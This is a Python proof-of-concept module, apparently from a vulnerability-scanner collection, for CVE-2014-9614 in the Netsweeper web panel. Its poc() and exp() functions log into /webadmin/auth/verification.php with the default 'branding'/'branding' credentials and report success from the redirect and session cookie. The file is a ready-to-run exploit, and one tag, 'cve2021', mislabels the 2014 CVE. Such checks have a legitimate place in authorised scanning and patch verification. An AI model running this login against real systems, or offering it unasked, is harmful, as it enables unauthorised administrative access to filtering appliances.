import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Netsweeper 4.0.5 - Default Weak Account''',
        "description": '''The Web Panel in Netsweeper before 4.0.5 has a default password of 'branding' for the branding account, which makes it easier for remote attackers to obtain access via a request to webadmin/.''',
        "severity": "critical",
        "references": [
            "https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-9614"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2014-9614",
            "cwe-id": "CWE-798"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "netsweeper", "default-login"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/webadmin/auth/verification.php"""
        method = "POST"
        data = """login=branding&password=branding&Submit=Login"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 302) and ("""../common/""" in str(resp0.headers) or """../start/""" in str(resp0.headers)) and ("""webadminU=""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url